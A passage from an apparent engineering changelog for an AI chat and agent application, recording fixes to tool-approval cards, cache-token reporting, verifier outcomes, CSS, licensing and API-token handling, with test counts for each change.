Lexical `recall@5 0.40, MRR 0.319`; hybrid `0.63, 0.633`. That is `P13-14`'s justification, and
it is now measured. The corpus declares its own provenance and the report prints it above the
numbers, because a reader who sees `0.63` without the word `fixture` will quote it. **Three
defects on the first run**, which is the row justifying itself: neither engine stems, so *what do
I drive* misses *User drives a diesel van* (`B62`); *who am i* reduces to zero content tokens, so
no lexical engine can answer the canonical memory question at all; and a test now fails if either
engine ever scores perfectly, because a corpus everything passes measures nothing.

### P3-26 + six owner decisions — a reminder that arrives late and says so
`bd634f7..HEAD`. **341 tracked, 154 done. 31 tests, 26 mutations, 0 regressions.**
A note reminder missed by more than sixty seconds was retired without ever being shown, and the
row framed it as a choice between two window widths. The owner took a third option that was not in
the row: **show it, and state its age.** The trade-off the row is built on — *"take the pasta off"*
wants the late one, *"standup starts now"* does not — exists only because the notification
pretended to be on time; *"Standup — was due 4 hours ago"* is a correct notification about a past
event and the reader can tell in one glance which case they are in. Twelve-hour lookback, the
owner's number, as a named constant. Both window comparisons moved together, because the fire
branch and the silent-retire branch are two halves of one boundary and changing only the first
would make a note both fire and retire. **Six decisions recorded in the same pass**
(`D-2026-09-08-01` … `-06`): `P1-08` becomes a global button-design setting rather than a computed
token; `P3-21`'s `max_tokens` belongs to the machine and must be settable as such; `P7-12` grants
the agent its own loop caps with loop detection as the precondition, not the caveat; `P7-13`
replaces the trust rungs rather than naming an order that does not exist; `P0-16`/`P0-17` prime for
public without flipping. **And `P3-26`'s row was carrying an unrelated paragraph glued onto its
end** — `P3-25`'s body, still present on `P3-25`, nothing lost, now stripped.

### P4-22 — two numbers in a log line, and a tenfold cost swing nobody could see
`ded3f56..HEAD`. **341 tracked, 153 done. 26 new tests, 0 regressions.**
`cache_read_input_tokens` and `cache_creation_input_tokens` were pulled out of the provider's
stream, written to a `logger.info`, and dropped. A cached input token costs roughly a tenth of a
fresh one, so a run whose stable prefix stops being cacheable gets an order of magnitude more
expensive with nothing visible changing — a timestamp folded into a system message would do it —
and nothing in the product would have said so. They ride the usage event now, sum per round
(because a prefix stops being cacheable *at a round*, and a per-turn total says the ratio dropped
and not where), and land in Message Stats as `92.3% hit (1,700 read, 100 written)`. The
denominator is everything billed, since a hit rate against fresh tokens alone flatters itself. The
rule at every layer is that absence means "not reported": a local llama.cpp has no prompt cache,
and "Cache 0% hit" there would be a claim about a mechanism that does not exist.

### P4-05 — the chain was on the wire and one field of it reached a toast
`26b9c5b..HEAD`. **341 tracked, 152 done. 24 new tests, 0 regressions.**
Every candidate, its index and the status it failed with have been on the `fallback` event since
the fallback was written. One field of it — `reason` — reached a six-second toast, and the reply
then sat under a role line reading "llama (fallback)" with no way to say what happened to the model
that was actually selected. Two gaps behind that. The chain was built inline at the single site
that reports a *successful* fallback, so the terminal "all candidates failed" error carried one
status and nothing else — the case where knowing what was tried matters most. And nothing saved it,
so it did not survive a reload. It is a footer pill now, through the popover `P4-16` extracted, and
the toast stays: one is the signal in the moment and the other is the record after it. Two of my
own assertions sliced source on `"return"` and on a bare function name and were measuring the
wrong thing — "All model candidates **return**ed no substantive output" contains that word.

### P4-19 — the error message the output crowded out
`93c0589..HEAD`. **341 tracked, 151 done. 26 new tests, 0 regressions.**
The row says the user only sees stderr when stdout is empty. The mechanism is worse than that: the
two streams were joined into one string and truncated **as one**, so a failing command with chatty
output lost its error entirely — measured against the real cap, 12,000 characters of stdout and the
`ValueError` on the end is gone, from the card and from the model's context. The "only when stdout
is empty" part was a branch order in the loop, reading `stdout or stderr or error` and never
reaching the second term. And both timeout branches returned the streams with no merged view, so a
killed command — the case where what it managed to print matters most — drew an empty card. stderr
now has a reserved quarter of the budget, spent only when there is an error to spend it on; the
panes are one builder instead of two copies that had the same defect; and the exit code is a number
on screen, because `127` and `124` were both a red card and nothing else.

### P4-21 — a deadline nobody was told about, and one None for four things
`aaf614f..HEAD`. **341 tracked, 150 done. 29 new tests, 0 regressions.**
Every approval card has a ten-minute life, computed on all of them and sent on none, so the card
sat there looking live and the click ten minutes later returned "This tool approval could not be
consumed." That sentence covered four unlike things — lapsed, unknown, somebody else's, a decision
the card does not offer — of which exactly one is fixable by asking again. Same shape as `P4-17`
and `P4-12`: a value that cannot say which of several things happened, reported as though it could.
The reason travels on an out-parameter so the four existing callers keep their contract. The
security half is that **`expired` is told only to the owner of the pending action**: the ownership
check exists so a guessed id cannot invalidate somebody's pending action, and "that one expired"
leaks precisely the fact the check withholds. A mutation caught the other half of that — a lapsed
card from a *different chat* was still being acknowledged.

### P4-20 — the refusal that overwrote the call that worked
`48e3557..HEAD`. **341 tracked, 149 done. 14 new tests, 0 regressions.**
`tool_start` is the only event that creates a card, and a refused call never runs, so it never got
one — its result arrived as a `tool_output` with nowhere to go. The row calls that a vanished card
and a stale pointer; the stale pointer is the worse half. `currentToolBubble` was cleared only at a
round boundary, so it outlived the card it pointed at, and a refusal arriving while an earlier card
was still open **rewrote that card** — a command that had run and succeeded became a blocked one,
and the successful call disappeared. Every event that skips `tool_start` hit this, refusals and
approval requests alike. `compare/stream.js` has always released the pointer at the end of a
result; the main path had not, which makes this a `Law 14` finding as much as a bug. Refusals have
their own event and their own card now, and the persisted event carries `blocked`, because a
refused call and a failed one both come back as a non-zero exit code and one of them was never
attempted. The two caller assertions from `P4-11` and `P4-12` needed teaching about a new card kind
for the third time in a day, so the exemption is now the rule it always was — options from a named
`*CardOptions` builder — instead of a list of names.

### P4-18 — promoted in silence, and clamped in silence
`8851a0a..HEAD`. **341 tracked, 148 done. 19 new tests, 0 regressions.**
Six places promote a chat turn to agent mode and every one wrote its reason to a log file. The
person who typed it watched an agent thread appear and was told nothing — and the second direction
was worse, because a light promotion withholds the shell and the file tools, and a model that could
not do something because a tool had been taken away read as a model that could not work out how.
Two extractions did the structural work: `note_escalation` makes setting the flag and recording the
reason one expression, so a seventh site cannot promote silently, and `escalation_withholds`
computes the clamp once for both the withholding and the report, so they cannot disagree. Both are
named functions because that is what a test can ask — and one pre-existing test that pinned the
inline `if` line got rewritten to ask the decision instead, which is the stronger test and the
reason the extraction was worth doing (`Law 20`). One of my own tests reached the real sqlite file;
it passed alone and failed inside the suite, which is the same shape as the stray `data/` write
that cost half an hour earlier in this project.

### P4-17 — three things returned the empty list, and one of them was agreement
`6510add..HEAD`. **341 tracked, 147 done. 24 new tests, 0 regressions.**
The verifier is the one step in the loop whose whole job is to not be taken on trust, and its
findings went into the prompt and nowhere else. Making them visible meant first making the verdict
honest: a bare list of issues, with the empty one returned by a pass, by an exception, and by a
model that answered without a verdict line — plus a fourth case in the parser, where
`VERIFICATION: FAIL` **without the colon** had nothing to split, fell through the FAIL test, and
was reported as a pass. Not blocking a completion on an error was right and is kept by construction
(`__bool__` is "are there issues"), but "an independent model agreed" and "no second model spoke"
are not the same sentence. Three outcomes now, all three reported, and the card refuses to draw a
tick for the one that means the check never happened.

### B60 — six gates, one index each way, and not one of them gating
`3bba46a..HEAD`. **341 tracked, 146 done. 14 new tests, 0 regressions.**
Found while doing `P4-16` and fixed here because that row's report could not be honest until there
was one thing to report. The index was assembled twice in agent mode — chat preface and agent loop
— and both landed in the same message array, because `agent_mode` is true only on the route whose
`else` branch calls `stream_agent_loop`. The duplicated catalogue was the small half. The large
half: the preface's copy passed `active_toolsets=None` and advertised procedures whose tools were
switched off, while the loop's copy ignored the `skills_enabled` preference, `incognito` and
`allow_tool_preprocessing` entirely — so **whichever copy honoured a gate, the other shipped
anyway, and turning skills off in preferences did not turn the index off.** The harness came before
the fix and measured two blocks; the fix is one injection plus one `suppress_skills`, with the four
grounds the route owns extracted into `skills_may_ship()` so a test can ask them directly. One
change was reverted on purpose and the row says why: widening the *tool*-availability gate is
probably right and there is no seam here that can see it.

### P4-16 — the highest-value gap in P4, and the reason it could not be honest
`9c95dbc..HEAD`. **341 tracked, 146 done. 23 new tests, 0 regressions.**
Up to a dozen procedures — several of them written by a *teacher model after watching a smaller
model fail* — enter every agent request, and nothing said which. Reporting them turned out to need
two prior facts. The index did not carry its own provenance, so "which teacher wrote this" was not
answerable from the thing the agent was actually shown. And there was no single answer to give: the
index is injected twice in agent mode, by the chat preface and by the loop, and the gates differ on
six axes (`B60`). The report merges by name and records every site that showed a procedure, so the
count is meaningful now and stays meaningful when one site stops contributing. The pill went in
beside the memories one by extracting the popover both need rather than copying fifty lines of
viewport arithmetic — and the wiring ratchet caught my first attempt pointing at a `skills-panel`
id that does not exist, because skills are a tab inside the Brain modal.

### P5-07 — the string worth copying, finally all there and finally copyable
`25980e0..HEAD`. **341 tracked, 145 done. 24 new tests, 0 regressions.**
The row waited on `P4-09` for a reason worth writing down: a copy button on a truncated command
hands back something that *looks* complete, which is worse than no button. With the whole command
now on the card, the button copies the full text when there is one and the visible line when there
is not — read out of the DOM as `textContent`, so what reaches the clipboard is exactly what the
card shows. Highlighting covers two languages and stops: `bash` and `python` commands are code in
those languages, and everything else is a path, a query or a JSON blob where a guess paints a
filename in string-literal green. The test worth keeping is the one that pins every selector the
click handler reaches for against the markup the builder writes — they live in different files,
nothing made them agree, and a mistyped class there is a button that silently copies nothing.

### P4-09 — the arguments were reachable once, live, if you were already looking
`5bb84e7..HEAD`. **341 tracked, 144 done. 15 new tests, 0 regressions.**
Third of `P4-01`'s dependants and the third instance of one pattern: `full_command` rode
`tool_start` and no other event, so the full arguments survived exactly as long as the running
card did. The `tool_output` that redraws the card dropped them, and the persisted event never had
them, which meant a reloaded thread showed the first eighty characters of a document write with no
way back to the rest of the file it had just written. One helper now puts them on all six sites,
reusing the cap the tool *output* already carries rather than inventing a second size policy — the
persisted event goes to the database on every message and a 40k body has no business living there
twice. The sharp edge was the refused approval: `command` is blanked when the sealed binding does
not match, and an expansion holding the whole of it would have shown **more** of an action this run
refused to run than of one it allowed. The expansion is a `<details>` and binds nothing, which is
`B56` staying fixed rather than a style preference.

### P4-12 — a badge that asserts authority has to be right about it
`f0f93f1..HEAD`. **341 tracked, 143 done. 25 new tests, 0 regressions.**
Same shape as `P4-11` one row earlier: `approved: true` had ridden four events since exact
approvals shipped and no line of the frontend had ever read it, so the one card in a thread that a
person stopped and allowed by hand looked exactly like a routine call. Rendering it as it stood
would have been worse than leaving it: two gates refuse an approved action *after* the card is up —
this replay's own pre-check and the dispatcher's `claim()`, which also refuses an unarmed run, an
approval granted before untrusted content arrived, a document action with no sealed target and a
workspace that stopped being safe — and every one of those still emitted a result card claiming the
user had authorised it. The result card and its persisted twin now say what happened; `tool_start`
still says what was believed when it fired. The badge is deliberately **not** remembered across the
rewrite the way the round is, and that is the row's decision rather than an inconsistency: silence
about a fact leaves the fact, silence about a claim is not the claim.

### P4-11 — the number was always on the wire and never on the glass
`6c07784..HEAD`. **341 tracked, 142 done. 36 new tests, 0 regressions.**
Nothing rendered the round, so nothing checked it, so it rotted in four places at once — and the
rot was invisible in exactly the way a number nobody reads always is. The sharpest of the four:
`tool_start` carried a round and the *persisted* `tool_event` carried a round and the `tool_output`
between them did not, so one action answered "which round?" after a reload and refused to answer it
live. The approved-action replay hardcoded `0` at four sites, which would have shipped as a visible
`0` on the one card in the thread the user personally authorised. That card's honest round is the
round it was **requested** in, so the pending approval now carries it — outside the binding digest,
because widening a seal for a badge changes what the seal means, and there is a test saying so
rather than a comment. Four files, one rule, so the fourteenth checker rather than four fixes.

### P4-03 — the handler was not dead; the emit was missing
`95e9d5e..HEAD`. **341 tracked, 141 done. 11 new tests, 0 regressions.**
The row asked the question before the fix, and the answer was one grep away: `chat.js` has three
listeners in this family, and the backend emits `skill_save_failed` from three sites and
`escalation_failed` from two. `skill_saved` from none. Every way of *failing* to save a skill
reported; succeeding was the one outcome nobody was told about. Deleting the listener — the fix the
row was filed to propose — would have made that permanent and looked like tidying up. `manage_skills`
now reports what it saved, and both completion paths emit it, because a teacher skill goes through an
approval card and an agent-written one does not.

### P4-02 — a timer that started late and never caught up
`1132601..HEAD`. **341 tracked, 140 done. 11 new tests, 0 regressions.**
The rename the row names is real — the server sends `elapsed_s`, the one reader looked for
`json.elapsed` — and it was the smaller half. The card's timer is a local stopwatch started when
`tool_start` is *rendered*, so it is always behind by the dispatch, the network and the approval
click, and on a resumed background stream it restarts at zero on a tool a minute old. The 50ms ticker
stays, because a number that only moves on the 2s heartbeat reads as frozen; its **anchor** is
re-based on the server's figure at every progress event. A missing, negative or unparseable figure
leaves the local clock alone — a late number that moves beats a card that jumps to 1970.

### P4-01 — six copies, five differences, and one of them was a bug
`7a9cf15..HEAD`. **341 tracked, 139 done. 34 new tests, 0 regressions.**
The row named three divergences and all three hold; the labels turned out to be three vocabularies,
not two, with every *finished* card in every copy falling back to the raw tool id. Two more nobody had
listed: the diff renderer existed twice identically, and compare mode bound a per-node click listener
on top of the delegated one — so both fired, the card toggled twice, and clicking a tool card in
compare mode did nothing at all (`B56`). The decision the row demanded: **two label forms per tool is
correct**, a gerund under the wave and a noun beside "done"; the defect was that nobody said so and
the finished cards used neither. `B57` filed — the precache list names the shell's script tags and
not the 67 unlisted modules behind them.

### P3-23 — the configuration an operator can find, versus the configuration there is
`e5ce2a3..HEAD`. **341 tracked, 138 done. 40 new tests, 0 regressions.**
140 variables read, 62 declared. The thirteenth checker measures both directions and measures them
differently: undeclared from literal getenv call sites (precise, and blind to indirect reads),
unreferenced by plain text across the whole repo (loose, because a false alarm there gets a working
setting deleted). The second is held at zero and is zero — nothing documented here is dead. Eleven
were written up, chosen by what the silence costs: the five SSRF hardening switches plus the CalDAV
one, where `Law 17` means the *stricter* setting was the undiscoverable one, and the search-provider
keys. The remaining 74 are ratcheted; 74 shallow entries would make the file worse at its only job.

### P3-22 — a switch with no handle, and the two copies behind it
`81c1d38..HEAD`. **341 tracked, 137 done. 42 new tests, 0 regressions.**
`supports_tools` decides whether an endpoint is sent tool schemas at all, and nothing in the product
ever set it. Three states on each endpoint row now — Auto / Native / Fenced — and Auto sends `null`
rather than omitting the key, or it would be a one-way door. "See what it currently believes" could
not be answered by showing the stored value, so the decision is a named pure function the panel and
the agent both call. Two bugs fell out: `B55`, one name on two functions that answer different questions — merging
them was tried and the suite refused, because LM Studio and local vLLM are not Ollama; and two
parsers for this one field, so an endpoint created with `yes` reverted to Auto on the next save.

### P3-19 — seven copies of one preamble, and the defect in it
`5607e0d..HEAD`. **341 tracked, 136 done. 18 new tests, 0 regressions.**
`getContext` returns null rather than throwing when 2D canvas is unavailable, and every one of the
seven background animators dereferenced it two lines later — so a machine with hardware acceleration
off got a `TypeError` out of `applyTheme` and **no theme at all**, plus an empty full-screen canvas
left over the page. One guarded helper now owns the preamble: it asks for the context before inserting
anything, and a refusal leaves the `bg-pattern-*` class in place so the pattern degrades to its static
form. The row's Verify is executed — the real `applyBgPattern` runs under node against a canvas that
refuses, for all seven patterns, with a working-context control so the suite cannot pass vacuously.

### P3-18 — the fix was already written; eight places had not heard
`68c4f0d..HEAD`. **341 tracked, 135 done. 6 new tests, 0 regressions.**
`topPortalZ()` derives a popover's z from the live tool-window stack, because a literal cannot keep up
with a bring-to-front counter. Fourteen body-portaled fixed elements still carried a literal at or
below the dock-chip floor; four belong underneath and are named, eight were defects. One sat on 10001
— the exact value the helper's own comment calls out as the bug — in a file written after the fix. The
Calendar Settings panel was pinned at 999 and opened behind the calendar that opened it. The image
editor's gallery picker shared a layer with the toolbar it is meant to cover. The old test named two
converted files; the new one is the rule, and reads the floor from the source it is anchored to.

### P3-17 — a row whose acceptance test already passed
`e19f4c4..HEAD`. **341 tracked, 134 done. 14 new tests, 0 regressions.**
It named `bare except:` and there were zero of those when it was written, so the `Verify` line passed
on an unfixed tree. The real population is `except ...: pass` — 440 of them, 12 explained — and grep
cannot count it, which is why the row carried three different numbers. The twelfth checker parses, and
splits: a hard rule at zero for silent handlers that hide a *change* (26 of them, all closed), and a
ratchet at 402 for the rest, most of which are cleanup and parse-with-fallback where swallowing is
right. Three of the 26 failed **open** — they build `disabled_tools` by adding names, so a quiet import
failure left tools enabled that an operator had switched off.

### P3-16 — a read that fails quietly, and the write that makes it permanent
`f5a55ba..HEAD`. **341 tracked, 133 done. 22 new tests, 0 regressions.**
`except: return {}` is right for a loader that must not crash at startup and is data loss the moment
a caller hands it back to be saved. Six instances, including the one the row cites: `api_keys.json`,
where one truncated file plus one key saved in the panel erased every other provider's. `auth.json`
was worse than loss — an unreadable user database read as *no users*, which opens first-run setup to
whoever asks. `integrations.json` re-encrypted the empty string over live credentials at load time,
because `decrypt()` returns "" on failure by design and that was on the write path. The mechanism is
one keyword; the audit is the eleventh checker, which classifies all 35 write sites and fails on a
config file nobody has thought about. The negative results are half the row: skills, the rename
migrations, and everything rebuildable are safe, and guarding the last of those would wedge it.

### P3-10b — a year of onboarding switched off for the wrong reason
`fd384ee..HEAD`. **341 tracked, 132 done. 24 new tests, 0 regressions.**
`tourAutoplay.js` was stubbed with "Disabled for v1 stability: opening ordinary app windows must never
auto-spawn tour overlays", and the overlays were fine. What was not: a slash command echoes itself as a
**user message**, persists it, and materialises a session to hold it — so opening Settings on a fresh
install would have created a chat containing `/tour-settings`. A tour now declares it is not
conversation (`{ echo: false, persist: false }`, both defaulting to today's behaviour). Three more
defects on the way in: the mobile exclusion the header claimed and never implemented, tours wiping a
typed draft, and the setup wizard. Three of the four gates defer *without* burning the one-shot marker.
Settings → Appearance now has the toggle and a *Show again*. `B54` came out of `P3-10`'s own test.

### P3-10 — a poller nothing imported, and the comment that stood in for a test
`a5047ee..HEAD`. **341 tracked, 131 done. 9 new tests, 0 regressions.**
`calendar/reminders.js` polled `/api/notes?label=calendar` and fired its own notifications; nothing
has ever imported it, because the Notes reminder loop took the job over. The whole argument for
deleting it was a comment in another file saying so — so before anything was removed, both halves
were lifted out and run: the note the calendar actually builds, fed to the loop that actually
dispatches. A mutation that gates dispatch on the label is caught. The one real delta — a five-minute
catch-up for a missed reminder against the live loop's one — is pinned by a test and filed as
`P3-26` rather than changed inside a deletion. `CACHE_NAME` bumped, and the precache list now has a
test that every entry names a file that exists: a 404 in it fails the whole service-worker install.

### P3-09 — a light page that opened a black dropdown
`1bc11b4..HEAD`. **340 tracked, 130 done. 7 new tests, 0 regressions.**
Native controls are painted by the browser and `color-scheme` is the only thing that tells it
which way. Four rules pinned `dark`, `select` among them, so the four light themes opened black
dropdowns — while the fix sat behind `:root.light`, a class nothing has ever added. Derived from
the palette now (WCAG luminance of `--bg`, threshold 0.5), in all three places the palette is
written, because two of them paint before the module boots and one is the only thing the login
page runs. The margin is 0.81. **The row's second half is withdrawn**: recovering the light
syntax palette inside `:root.light` is impossible *and* unnecessary — `theme.js` writes derived
`--hl-*` inline, and inline beats a class rule, so adding the class would recover nothing of it.
Nothing deleted.

### B53 — five modules sharing one router, and a suite that was green in one order
`e98ec1a..HEAD`. **340 tracked, 129 done. 13 new tests, 0 regressions.**
Found by accident: an ad-hoc `-k` slice, run to check `P3-12`, failed a test the full suite
passes. `setup_*_routes()` in five modules decorated a **module-level** `APIRouter` and returned
it, so a second call registered a second copy of every route and FastAPI answered with the
first — the second call's session manager silently ignored. Production calls each once, so
nothing shipped broken; the suite is where it showed, and **five test files carried a workaround
for it**, one of them with the diagnosis written in a comment four weeks ago. Routers are built
inside their setup functions now, all five workarounds are gone, and a test fails if one
returns.

### B52 — the row I filed against a feature that already works
`e98ec1a..HEAD`. **340 tracked, 129 done. 2 new tests, 0 regressions.**
`P3-12`'s scan reads ids built by *prefix* and, until now, not by *suffix* — so
`getElementById(selectEl.id + '-logo')` was invisible and six working provider-logo spans came
back as orphans. I read "nothing references this id" as "this was never built", filed `P3-25`
asking for it, and did not open `settings.js` to check. **That is the exact `Law 9` failure the
row I had just written warns about**, in the hour after writing it. The scan reads suffixes now,
and only where the base is itself an id the page has, so a generic `-btn` cannot silence
everything ending in it. `P3-25` is withdrawn on its own row, not deleted. The itemisation is
**18, not 24**.

### P3-12 — ids nothing reads, and the feature that was hiding in them
`9534088..HEAD`. **340 tracked, 128 done. 8 new tests, 0 regressions.**
The row said *delete the verified-dead elements*; **none of the 24 is one**. Four are markup a
runtime menu superseded — and the replacement carried Rename, Archive, Delete and Favorite
across and left **Memory** behind, so `memoryModule.extractMemory` has been a complete feature
behind a live route with nothing able to call it (`B51`, restored). Six are provider-logo slots
Settings never fills while the admin panel fills its own (`P3-25`, filed). Three are anchors for
things never built; eleven are dead attributes on live elements. Nothing deleted. **Two blind
spots in the measurement, corrected**: constructed lookups (`getElementById('adv-' + key)`) and
inline scripts in `index.html` — and one of my own, where the comment explaining an orphan named
it in backticks and the scan read the explanation as a reference.

### P3-07 — one number decides what "mobile" means, and eight places disagreed
`e355dcf..HEAD`. **339 tracked, 127 done. 7 new tests, 0 regressions.**
The row was about a stylesheet and the stylesheet was the smaller half. **`B50`**:
`sidebar-layout.js` disagrees with itself — seven tests say 768, including the one that shows
the mobile backdrop, and three said 700, including click-outside-to-close. Between 700 and 767
the sidebar was an overlay with a backdrop inviting the click that dismisses it, and the
handler returned early. Four more 700s in the image editor's `right-panel.js` are why moving
only the CSS would have been a half-fix: the panel would have laid out as a sheet no gesture
could dismiss. **Two of the row's claims are corrected**: the "20px dead zone" does not exist
(that `min-width` pairs with a base rule, and a test says so), and "canonicalise to three" was
not the work — the other ten widths reflow components, not the shell. 13 widths → 12, and one
answer to where mobile ends.

### P3-01, P3-02 — two elements whose applied style nobody wrote
`18a9e64..HEAD`. **339 tracked, 126 done. 18 new tests, 0 regressions.**
The composer has never rendered as authored: a bare `#message` block pins four `!important`
declarations over `.chat-input-bar textarea#message`'s 14px / 1.5 — **and it belongs to a
section in which every other selector is dead**, an older composer layout kept in the file with
one id selector in it that still reaches something. Scoped, not deleted. **What the 13px cost
was invisible until it was measured**: `#message-ghost` is drawn over the textarea and authors
14px / 1.5 to match it, so the inline autocomplete ghost drifted further right with every
character. A test pins the two layers together now. `.attach-strip` was three blocks at equal
specificity, each replacing part of the last; collapsed at the values the cascade already
produced, with every declaration's origin recorded.

**One trap, from writing the comment**: a `*` `/` inside a CSS comment ends it, so quoting the
section name *with its delimiters* turned half the note into a selector — the test's own parser
caught it on the first run. Same shape as `check-wiring.py`'s comment-stripper incident.

### P3-04, P3-05, P3-06 — one name, one animation, and two that meant something else
`b388f6b..HEAD`. **339 tracked, 124 done. 8 new tests, 0 regressions.**
`@keyframes` are global and the last definition of a name wins for every consumer, silently.
`style.css` shipped 149 blocks under 143 names. **`research-pulse` was the live one**: a button
whose own comment says "glow" asks for a background pulse three lines above it and gets an
opacity-and-scale throb from 6,800 lines below. Renamed, both kept. Seven names for one 360°
rotation collapsed to `spin` — and the sweep had to leave the stylesheet, because `settings.js`
writes one of them into an inline style, and needed word boundaries, because `admin-spin` is a
prefix of the live class `admin-spinner`. **The check written for the cluster found a third
defect on its first run** (`B49`): a spinner naming keyframes that do not exist, inherited at
the fork baseline, that has never spun. `B48` is the tracker's own: two rows shared one id and
nothing checked. 149 → 139 blocks, 139 names, none defined twice.

### P1-14 — one name for the curve that decides how everything feels
`a505720..HEAD`. **339 tracked, 121 done. 5 new tests, 0 regressions.**
`cubic-bezier(0.34, 1.56, 0.64, 1)` on 34 transitions and animations, never named, so the one
decision that most defines the product's feel could only be changed by find-and-replace.
`--ease-signature` now, in `:root`. **Three near-misses stay literal on purpose** — same shape,
gentler overshoot, and nobody knows whether that is taste or drift; a test pins their counts so
a later sweep has to be a decision.

### P1-12 — the guard the row asked for, minus the reason it gave
`657e14f..HEAD`. **339 tracked, 120 done. 13 new tests, 0 regressions.**
The row said a CSS-only guard could not reach the keyframes `slashCommands.js` injects at
runtime. It can — `!important` beats a normal declaration whatever stylesheet it came from —
and that claim is withdrawn on the row. **The trap it did not name is the one that matters**:
21 `!important` motion declarations already live in `style.css`, and between two `!important`
author declarations specificity decides before order, so a `*` guard loses to all of them
while reading as correct. `:is(#\9#\9#\9, *)` fixes that and a test recomputes the ceiling
rather than pinning the spelling. `0.01ms` rather than `none`, because this product cleans up
in `animationend` handlers. The seven canvas animators — the half CSS genuinely cannot reach —
stop, the theme class stays, and the panel says why. `P1-15` files the 52 smooth-scroll sites
the CSS guard cannot override. **`B47` is what the four-line import broke on the way**: the JS
sandboxes hand-write a stub per import, so the stub list is a second copy of the import list —
54 theme assertions, one node path in a temp directory, and nothing saying why. The copier
reads the imports now.

### P0-21b — the row asked for twelve notices and the derivation found two more bugs
`7bcd753..HEAD`. **338 tracked, 119 done. 51 new tests, 0 regressions.**
Thirteen licence texts added and every one fetched at a version, not typed. The list came out
of the shipped bytes — webpack left 1,736 module paths in the blob — so `check-licences.py`
rule 7 recomputes it in CI instead of trusting a comment. Two bugs fell out. **`B45`**: the
vendored `html2pdf` bundle is not upstream's, by exactly one string in jsPDF's language table,
inherited at the fork baseline and recorded nowhere. **`B46`**: rule 7's first draft read a
hardcoded list of bundles, a mutation that emptied the list survived, and rewriting it to
derive the list from the tree immediately found that `mermaid.min.js` is a bundle too — three
Microsoft `vscode-*` packages with no notice anywhere. DOMPurify's dual offer is settled as
Apache-2.0 (`D-2026-09-07-01`), with Cure53's file shipped verbatim, both texts in it.

### P0-18 — 1,463 files that say what they are, and one that must not
`c44941f..HEAD`. **338 tracked, 118 done. 17 new tests, 0 regressions.**
`AGPL-3.0` and `AGPL-3.0-or-later` are different licences to anyone combining this with
something else, and which one Pantheon is under was stated **once**, in a README badge —
not in `NOTICE`, not in `package.json`, not on the container image, and in none of the
files. Now in all of them, as the identifier alone: `SPDX-FileCopyrightText: 2026 Panick`
on a file nobody here wrote would be the `GohuFont.ttf` mistake again (`P0-23`), and
`NOTICE` is already the authority on copyright. **`LICENSE` is deliberately not touched** —
its own second paragraph says changing it is not allowed, so the row's "state it in
`LICENSE`" is refused and the refusal is on the row. `.pantheon/check-spdx.py` enforces both
directions; the second — *no vendored file carries our identifier* — is the one `P0-16`
already got wrong once, pointed the other way.

### P0-31 closes — five red tests were the row, and one green one was worse
`29accaf..HEAD`. **338 tracked, 117 done. 7 new tests, 5 pre-existing failures fixed.**
The standing failure count goes **19 → 14**, and it was never flake: four fixtures asserted
`ody-math-pending` at a `pan-math-pending` module and one watched the wrong `localStorage`
bucket, since `P0-04`'s sweep. A sixth file was green and wrong — it retyped the constants it
spliced real functions out of, so it tested a key the product does not use. All read the
module now. **A kind the row never listed:** the agent's persistent shell was
`ody-agent-<session>`, and that name is how a *running* tmux session is found, so a rename
abandons a live shell and leaks the process — mint `pan-agent-`, adopt `ody-agent-`.
`.pantheon/check-fork-names.py` turns the row's `Verify:` into CI: comments and docstrings
excluded so history survives, 23 deliberate hits named with reasons, stale excuses fail too.

### P0-31 (part) — `pan_`, and every `ody_` token still works
`022ec9b..29accaf`. **338 tracked, 116 done. 10 new tests, 0 regressions.**
The fork's old name was on the one string this product asks you to paste into another
machine. `B43` had already put the prefix behind one constant, so the code half was two
values: mint `pan_`, honour both. **The second value is the row.** A rename revokes every
token issued before today — a phone that cannot be re-paired without holding it, a scrape
config that starts 401ing at 3am — and does it silently, on upgrade. Five shipped examples
that printed `ody_…` to a first-time user updated with it. `P0-31` stays open: the fixture
residue is next, and **five of the nineteen standing suite failures turn out to be exactly
that** — `test_markdown_lazy_lib_loading_js` pinning `ody-math-pending` against a
`pan-math-pending` module, and `test_pr6020_browser_review_regressions` keying a stub
`localStorage` on `ody-session-cost-runs`.

### B43 — a token the tool could mint but the door would not open, and one it could not shut
`79d18ef..022ec9b`. **338 tracked, 116 done. 16 new tests, 0 regressions.**
Counting `P0-31`'s mint sites found a third one the row never named, and it was broken three
ways: no prefix, no owner, no cache invalidation. The first two fail closed. The third fails
open — `manage_tokens delete` said *"Deleted token"* and the token went on authenticating out
of the middleware's in-memory map until the next restart, because a tool running in the model
loop has no `Request` to reach `app.state.invalidate_token_cache` through. `core/api_tokens.py`
is the shared thing the four sites now have: the minted prefix, the separately-named accepted
prefixes, and a process-level invalidator registry. That also makes `P0-31`'s rename a
two-value change instead of a four-file one.

### B26 — the guard that ran before first paint, and matched nothing
`e17dd93..79d18ef`. **338 tracked, 116 done. 5 new tests, 0 regressions.**
Sixteen CSS selectors read three `html.ody-…` classes that `P0-04`'s rename had already
turned into `pan-…` on the writing side, so the pre-paint sidebar guard had been dead
since the sweep — a visible flash on every cold load for anyone whose sidebar is off or
mini. `B26` said ten selectors in `static/style.css`; there are six more in
`static/index.html`'s inline `<style>`, in the same file the row cites for the writers.
`tests/test_root_class_wiring.py` is the guard, and it joins the two sides in both
directions. **`:root.light` is the finding it turned up and did not fix**: seven rules,
no writer, and none at the fork point either — pre-existing upstream, so it is named in
the test's allowlist with the reason rather than deleted (`Law 1`).

### P3-20 — the 124 is not a backlog, and the row that said so was mine
`48825ac..HEAD`. **338 tracked, 135 done. No code change.**

The ids were classified by how each is reached rather than by prefix. **At least 87 of 124 are guarded
by construction** — JS that knows the markup may be absent and returns early. That is a feature removed
cleanly, not drift. About ten more are dead `||` fallbacks that harm nothing, eleven sit in the two
genuinely uncalled functions, and the residue is small.

The classifier ran four times and the number fell every time — 38 → 20 → 16 — because each pass found
another guard spelling it had missed. Spot-checking the last sixteen found more false positives:
`notes-panel` is a modal-registry key, not an element id at all.

So the row's `Verify` was wrong, and I wrote it. Bringing the ceiling down means deleting guarded code
that costs nothing. **The value is the ratchet, not the number**: it cannot grow, so a new id with no
markup surfaces on the day it is written — which is how `H02`'s rail button and `H07`'s dead CardDAV
block would have been caught the first time.

### H18 — the last of the settings the model could change and you could not
`dfd152a..HEAD`. **338 tracked, 135 done. Suite 7,314 → 7,333 passing.**

Eight controls, and two deliberate exceptions. The interesting one is the token budget:
`agent_input_token_budget: 6000` is a **sentinel** meaning "scale to the model's window", not a cap of
6000 — so a plain number box would let someone type 6000 meaning a cap and silently get auto. It is a
